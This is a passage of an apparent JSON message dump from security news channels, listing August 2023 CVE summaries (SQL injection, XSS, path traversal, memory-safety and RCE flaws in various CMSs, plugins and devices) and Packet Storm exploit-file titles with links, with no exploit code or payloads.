+    "message": "‼ CVE-2023-39526 ‼\n\nPrestaShop is an open source e-commerce web application. Versions prior to 1.7.8.10, 8.0.5, and 8.1.1 are vulnerable to remote code execution through SQL injection and arbitrary file write in the back office. Versions 1.7.8.10, 8.0.5, and 8.1.1 contain a patch. There are no known workarounds.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4199 ‼\n\nA vulnerability, which was classified as critical, was found in SourceCodester Inventory Management System 1.0. This affects an unknown part of the file catagory_data.php. The manipulation of the argument columns[1][data] leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-236289 was assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4200 ‼\n\nA vulnerability has been found in SourceCodester Inventory Management System 1.0 and classified as critical. This vulnerability affects unknown code of the file product_data.php.. The manipulation of the argument columns[1][data] leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-236290 is the identifier assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34477 ‼\n\nImproper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability allows SQL Injection.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-23757 ‼\n\nImproper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability allows SQL Injection.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34476 ‼\n\nImproper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability allows SQL Injection.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-23758 ‼\n\nImproper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability allows SQL Injection.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38045 ‼\n\nImproper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in advcomsys.com oneVote component for Joomla. It allows XSS Targeting Non-Script Elements.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38044 ‼\n\nImproper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability allows SQL Injection.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36220 ‼\n\nDirectory Traversal vulnerability in Textpattern CMS v4.8.8 allows a remote authenticated attacker to execute arbitrary code and gain access to sensitive information via the plugin Upload function.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-2843 ‼\n\nThe MultiParcels Shipping For WooCommerce WordPress plugin before 1.14.15 does not properly sanitize and escape a parameter before using it in an SQL statement, which could allow any authenticated users, such as subscribers, to perform SQL Injection attacks.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2021-24916 ‼\n\nThe Qubely WordPress plugin before 1.8.6 allows unauthenticated user to send arbitrary e-mails to arbitrary addresses via the qubely_send_form_data AJAX action.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-3492 ‼\n\nThe WP Shopping Pages WordPress plugin through 1.14 does not have CSRF check in some places, and is missing sanitisation as well as escaping, which could allow attackers to make logged in admin add Stored XSS payloads via a CSRF attack.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "defcon_news",
+    "message": "Datalife Engine 10 SQL Injection\nhttps://packetstormsecurity.com/files/174014/datalifeengine10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174014/datalifeengine10-sql.txt"
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "defcon_news",
+    "message": "Cyber Infinite CMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/174012/cyberinfinitecms10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174012/cyberinfinitecms10-sql.txt"
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "defcon_news",
+    "message": "CSC-CMS 1.0.0 SQL Injection\nhttps://packetstormsecurity.com/files/174010/csccms100-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174010/csccms100-sql.txt"
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "defcon_news",
+    "message": "CMS Genetics Centre 4.0.1 SQL Injection\nhttps://packetstormsecurity.com/files/174009/cmsgeneticscentre401-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174009/cmsgeneticscentre401-sql.txt"
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "defcon_news",
+    "message": "Conference Management Software 3.5.1 SQL Injection\nhttps://packetstormsecurity.com/files/174006/cms351-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174006/cms351-sql.txt"
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38392 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Hiroaki Miyashita Custom Field Template plugin <=Â 2.5.9 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-20818 ‼\n\nIn wlan service, there is a possible out of bounds read due to improper input validation. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS07460540; Issue ID: ALPS07460540.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-20813 ‼\n\nIn wlan service, there is a possible out of bounds read due to improper input validation. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS07453549; Issue ID: ALPS07453549.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-20810 ‼\n\nIn IOMMU, there is a possible information disclosure due to improper input validation. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: DTV03692061; Issue ID: DTV03692061.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-20802 ‼\n\nIn imgsys, there is a possible memory corruption due to improper input validation. This could lead to local escalation of privilege with System execution privileges needed. User interaction is needed for exploitation. Patch ID: ALPS07420968; Issue ID: ALPS07420976.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4193 ‼\n\nA vulnerability has been found in SourceCodester Resort Reservation System 1.0 and classified as critical. This vulnerability affects unknown code of the file view_fee.php. The manipulation of the argument id leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-236236.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-20803 ‼\n\nIn imgsys, there is a possible memory corruption due to improper input validation. This could lead to local escalation of privilege with System execution privileges needed. User interaction is needed for exploitation. Patch ID: ALPS07326455; Issue ID: ALPS07326374.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-20815 ‼\n\nIn wlan service, there is a possible out of bounds write due to improper input validation. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS07453587; Issue ID: ALPS07453587.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4192 ‼\n\nA vulnerability, which was classified as critical, was found in SourceCodester Resort Reservation System 1.0. This affects an unknown part of the file manage_user.php. The manipulation of the argument id leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-236235.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4196 ‼\n\nCross-site Scripting (XSS) - Stored in GitHub repository cockpit-hq/cockpit prior to 2.6.3.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4185 ‼\n\nA vulnerability was found in SourceCodester Online Hospital Management System 1.0. It has been classified as critical. Affected is an unknown function of the file patientlogin.php. The manipulation of the argument loginid/password leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-236220.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4184 ‼\n\nA vulnerability was found in SourceCodester Inventory Management System 1.0 and classified as critical. This issue affects some unknown processing of the file sell_return.php. The manipulation of the argument pid leads to sql injection. The attack may be initiated remotely. The associated identifier of this vulnerability is VDB-236219.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4179 ‼\n\nA vulnerability classified as critical has been found in SourceCodester Free Hospital Management System for Small Practices 1.0. Affected is an unknown function of the file /vm/doctor/doctors.php?action=view. The manipulation of the argument id leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-236214 is the identifier assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37581 ‼\n\nInsufficient input validation and sanitation in Weblog Category name, Website About and File Upload features in all versions of Apache Roller on all platforms allows an authenticated user to perform an XSS attack. Mitigation: if you do not have Roller configured for untrusted users, then you need to do nothing because you trust your users to author raw HTML and other web content. If you are running with untrusted users then you should upgrade to Roller 6.1.2 and you should disable Roller's File Upload feature.?\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4180 ‼\n\nA vulnerability classified as critical was found in SourceCodester Free Hospital Management System for Small Practices 1.0. Affected by this vulnerability is an unknown functionality of the file /vm/login.php. The manipulation of the argument useremail/userpassword leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-236215.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34010 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability inÂ submodule ofÂ David Lingren Media Library Assistant plugin Â <= 3.0.7 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37874 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerabilityÂ in Dimitar Ivanov HTTP Headers plugin <=Â 1.18.11 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36689 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in WPFactory WPFactory Helper plugin <=Â 1.5.2 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34377 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Joseph C Dolson My Content Management plugin <=Â 1.7.6 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37873 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in WooCommerce Shipping Multiple Addresses plugin <=Â 3.8.5 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-30491 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in CodeBard CodeBard's Patron Button and Widgets for Patreon plugin <=Â 2.1.8 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36686 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in CartFlows Pro plugin <=Â 1.11.11 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-06",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36678 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in WP-buy WP Content Copy Protection & No Right Click plugin <=Â 3.5.5 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-05",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4187 ‼\n\nCross-site Scripting (XSS) - Stored in GitHub repository instantsoft/icms2 prior to 2.16.1-git.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39344 ‼\n\nsocial-media-skeleton is an uncompleted social media project. A SQL injection vulnerability in the project allows UNION based injections, which indirectly leads to remote code execution. Commit 3cabdd35c3d874608883c9eaf9bf69b2014d25c1 contains a fix for this issue.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2020-26064 ‼\n\nA vulnerability in the web UI of Cisco SD-WAN vManage Software could allow an authenticated, remote attacker to gain read and write access to information that is stored on an affected system. The vulnerability is due to improper handling of XML External Entity (XXE) entries when parsing certain XML files. An attacker could exploit this vulnerability by persuading a user to import a crafted XML file with malicious entries. A successful exploit could allow the attacker to read and write files within the affected application.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4158 ‼\n\nCross-site Scripting (XSS) - Stored in GitHub repository omeka/omeka-s prior to 4.0.3.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39551 ‼\n\nPHPGurukul Online Security Guards Hiring System v.1.0 is vulnerable to SQL Injection via osghs/admin/search.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4157 ‼\n\nImproper Input Validation in GitHub repository omeka/omeka-s prior to 4.0.3.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39552 ‼\n\nPHPGurukul Online Security Guards Hiring System v.1.0 is vulnerable to Cross-Site Scripting (XSS).\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38964 ‼\n\nCreative Item Academy LMS 6.0 was discovered to contain a cross-site scripting (XSS) vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-41401 ‼\n\nOpenRefine <= v3.5.2 contains a Server-Side Request Forgery (SSRF) vulnerability, which permits unauthorized users to exploit the system, potentially leading to unauthorized access to internal resources and sensitive file disclosure.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-29689 ‼\n\nPyroCMS 3.9 contains a remote code execution (RCE) vulnerability that can be exploited through a server-side template injection (SSTI) flaw. This vulnerability allows a malicious attacker to send customized commands to the server and execute arbitrary code on the affected system.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "defcon_news",
+    "message": "Virtual Snipers DMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/173965/virtualsnipersdms10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/173965/virtualsnipersdms10-sql.txt"
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "defcon_news",
+    "message": "Virtues cpanelCMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/173964/virtuscpanelcms10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/173964/virtuscpanelcms10-sql.txt"
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "defcon_news",
+    "message": "IMDShift - Automates Migration Process Of Workloads To IMDSv2 To Avoid SSRF Attacks\nhttp://www.kitploit.com/2023/08/imdshift-automates-migration-process-of.html",
+    "urls": [],
+    "webpage_url": "https://www.kitploit.com/2023/08/imdshift-automates-migration-process-of.html"
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-33665 ‼\n\nai-dev aitable before v0.2.2 was discovered to contain a SQL injection vulnerability via the component /includes/ajax.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36158 ‼\n\nCross Site Scripting (XSS) vulnerability in sourcecodester Toll Tax Management System 1.0 allows remote attackers to run arbitrary code via the First Name and Last Name fields on the My Account page.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36131 ‼\n\nPHPJabbers Availability Booking Calendar 5.0 is vulnerable to Incorrect Access Control due to improper input validation of password parameter.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36138 ‼\n\nPHPJabbers Cleaning Business Software 1.0 is vulnerable to Cross Site Scripting (XSS) via the theme parameter of preview.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38708 ‼\n\nPimcore is an Open Source Data & Experience Management Platform: PIM, MDM, CDP, DAM, DXP/CMS & Digital Commerce. A path traversal vulnerability exists in the `AssetController::importServerFilesAction`, which allows an attacker to overwrite or modify sensitive files by manipulating the pimcore_log parameter.This can lead to potential denial of service---key file overwrite.The impact of this vulnerability allows attackers to: overwrite or modify sensitive files, potentially leading to unauthorized access, privilege escalation, or disclosure of confidential information. This could also cause a denial of service (DoS) if critical system files are overwritten or deleted.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-0525 ‼\n\nWeak Encoding for Password vulnerability in Mitsubishi Electric Corporation GOT2000 Series GT27 model versions 01.49.000 and prior, GT25 model versions 01.49.000 and prior, GT23 model versions 01.49.000 and prior, GT21 model versions 01.49.000 and prior, GOT SIMPLE Series GS25 model versions 01.49.000 and prior, GS21 model versions 01.49.000 and prior, GT Designer3 Version1 (GOT2000) versions 1.295H and prior and GT SoftGOT2000 versions 1.295H and prior allows a remote unauthenticated attacker to obtain plaintext passwords by sniffing packets containing encrypted passwords and decrypting the encrypted passwords, in the case of transferring data with GT Designer3 Version1(GOT2000) and GOT2000 Series or GOT SIMPLE Series with the Data Transfer Security function enabled, or in the case of transferring data by the SoftGOT-GOT link function with GT SoftGOT2000 and GOT2000 series with the Data Transfer Security function enabled.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36137 ‼\n\nThere is a Cross Site Scripting (XSS) vulnerability in the \"theme\" parameter of preview.php in PHPJabbers Class Scheduling System 1.0.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-04",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38941 ‼\n\ndjango-sspanel v2022.2.2 was discovered to contain a remote command execution (RCE) vulnerability via the component sspanel/admin_view.py -> GoodsCreateView._post.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-33666 ‼\n\nai-dev aioptimizedcombinations before v0.1.3 was discovered to contain a SQL injection vulnerability via the component /includes/ajax.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39121 ‼\n\nemlog v2.1.9 was discovered to contain a SQL injection vulnerability via the component /admin/user.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-35081 ‼\n\nA path traversal vulnerability in Ivanti EPMM versions (11.10.x < 11.10.0.3, 11.9.x < 11.9.1.2 and 11.8.x < 11.8.1.2) allows an authenticated administrator to write arbitrary files onto the appliance.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38942 ‼\n\nDango-Translator v4.5.5 was discovered to contain a remote command execution (RCE) vulnerability via the component app/config/cloud_config.json.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-0956 ‼\n\nExternal input could be used on TEL-STER TelWin SCADA WebInterface to construct paths to files and directories without properly neutralizing special elements within the pathname, which could allow an unauthenticated attacker to read files on the system.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-33366 ‼\n\nA SQL injection vulnerability exists in Suprema BioStar 2 before 2.9.1, which allows authenticated users to inject arbitrary SQL directives into an SQL statement and execute arbitrary SQL commands.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-33365 ‼\n\nA path traversal vulnerability exists in Suprema BioStar 2 before 2.9.1, which allows unauthenticated attackers to fetch arbitrary files from the server's web server.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36213 ‼\n\nSQL injection vulnerability in MotoCMS v.3.4.3 allows a remote attacker to gain privileges via the keyword parameter of the search function.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4145 ‼\n\nCross-site Scripting (XSS) - Stored in GitHub repository pimcore/customer-data-framework prior to 3.4.2.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-26838 ‼\n\nPath traversal vulnerability in Importing Mobile Device Data of Cybozu Remote Service 3.1.2 allows a remote authenticated attacker to cause a denial-of-service (DoS) condition.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-22277 ‼\n\nUse after free vulnerability exists in CX-Programmer Ver.9.79 and earlier. By having a user open a specially crafted CXP file, information disclosure and/or arbitrary code execution may occur. This vulnerability is different from CVE-2023-22317 and CVE-2023-22314.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39097 ‼\n\nWebBoss.io CMS v3.7.0.1 contains a stored cross-site scripting (XSS) vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-3348 ‼\n\nThe Wrangler command line tool (<=wrangler@3.1.0) was affected by a directory traversal vulnerability when running a local development server for Pages (wrangler pages dev command). This vulnerability enabled an attacker in the same network as the victim to connect to the local development server and access the victim's files present outside of the directory for the development server.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39096 ‼\n\nWebBoss.io CMS v3.7.0.1 contains a stored Cross-Site Scripting (XSS) vulnerability due to lack of input validation and output encoding.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4133 ‼\n\nA use-after-free vulnerability was found in the cxgb4 driver in the Linux kernel. The bug occurs when the cxgb4 device is detaching due to a possible rearming of the flower_stats_timer from the work queue. This flaw allows a local user to crash the system, causing a denial of service condition.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4132 ‼\n\nA use-after-free vulnerability was found in the siano smsusb module in the Linux kernel. The bug occurs during device initialization when the siano device is plugged in. This flaw allows a local user to crash the system, causing a denial of service condition.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-22314 ‼\n\nUse after free vulnerability exists in CX-Programmer Ver.9.79 and earlier. By having a user open a specially crafted CXP file, information disclosure and/or arbitrary code execution may occur. This vulnerability is different from CVE-2023-22277 and CVE-2023-22317.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-22317 ‼\n\nUse after free vulnerability exists in CX-Programmer Ver.9.79 and earlier. By having a user open a specially crafted CXP file, information disclosure and/or arbitrary code execution may occur. This vulnerability is different from CVE-2023-22277 and CVE-2023-22314.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "defcon_news",
+    "message": "WordPress Adivaha Travel 2.3 SQL Injection\nhttps://packetstormsecurity.com/files/173948/wpadihavatp23-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/173948/wpadihavatp23-sql.txt"
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "defcon_news",
+    "message": "PHPJabbers Bus Reservation System 1.1 SQL Injection\nhttps://packetstormsecurity.com/files/173945/phpjbrs11-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/173945/phpjbrs11-sql.txt"
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "defcon_news",
+    "message": "WebCoder CMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/173934/webcodercms10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/173934/webcodercms10-sql.txt"
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "defcon_news",
+    "message": "WebCom CMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/173933/webcomcms10-sql.txt",
+    "urls": [],
